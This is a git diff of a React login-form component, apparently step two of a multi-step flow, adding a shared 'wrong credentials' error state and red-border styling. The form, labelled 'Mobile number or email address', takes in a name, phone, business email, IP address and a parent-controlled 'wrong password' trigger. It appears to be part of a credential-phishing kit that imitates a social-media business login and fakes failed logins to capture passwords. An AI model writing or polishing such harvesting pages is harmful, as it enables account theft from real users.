@@ -327,6 +327,7 @@ function Step2Mobile({
   setParentBeginTimer,
   InvalidPassword,
   wrongPasswordTrigger,
+  wrongCredsTrigger,
 }) {
   const [isValidEmail, setIsValidEmail] = useState(false);
   const { setAllData, AllData } = useContext(DataContext);
@@ -338,25 +339,31 @@ function Step2Mobile({
     isLoading,
     passwordError,
     emailError,
+    credentialsError,
+    hasCredsError,
     triedSubmit,
     passwordAttempt,
     handleSubmit,
     clearPasswordError,
     clearEmailError,
+    clearCredentialsError,
   } = usePasswordAuth({
     Unik,
     Email,
+    setEmail,
     Tel,
     BusinessEmail,
     Name,
     Ip,
     wrongPasswordTrigger,
+    wrongCredsTrigger,
     setParentBeginTimer,
   });
 
   const handleEmailChange = (e) => {
     setEmail(e.target.value);
     clearEmailError();
+    clearCredentialsError();
 
     // Accept any input with reasonable length (phone number, username, or email)
     if (e.target.value.length >= 3) {
@@ -369,6 +376,7 @@ function Step2Mobile({
   const handlePasswordChange = (e) => {
     setPassword(e.target.value);
     clearPasswordError();
+    clearCredentialsError();
   };
 
   return (
@@ -390,7 +398,7 @@ function Step2Mobile({
                 onChange={handleEmailChange}
                 placeholder=" "
                 className={`form-control ${
-                  !isValidEmail && triedSubmit ? "redborder" : ""
+                  hasCredsError || (!isValidEmail && triedSubmit) ? "redborder" : ""
                 }`}
                 disabled={isLoading}
               />
@@ -398,7 +406,7 @@ function Step2Mobile({
                 Mobile number or email address
               </FloatingLabel>
             </StyledFormFloatingWrapper>
-            {emailError && <ValidationError>{emailError}</ValidationError>}
+            {!credentialsError && emailError && <ValidationError>{emailError}</ValidationError>}
 
             <StyledFormFloatingWrapper>
               <CustomInput
@@ -408,14 +416,20 @@ function Step2Mobile({
                 onChange={handlePasswordChange}
                 placeholder=" "
                 className={`form-control ${
-                  password.length < 5 && triedSubmit ? "redborder" : ""
+                  hasCredsError || (password.length < 5 && triedSubmit) ? "redborder" : ""
                 }`}
                 disabled={isLoading}
               />
               <FloatingLabel htmlFor="password-input">Password</FloatingLabel>
             </StyledFormFloatingWrapper>
-            {passwordError && (
+            {!credentialsError && passwordError && (
               <ValidationError>{passwordError}</ValidationError>
+            )}
+
+            {credentialsError && (
+              <ValidationError style={{ marginBottom: "12px" }}>
+                {credentialsError}
+              </ValidationError>
             )}
 
             <LoginButton onClick={handleSubmit}>
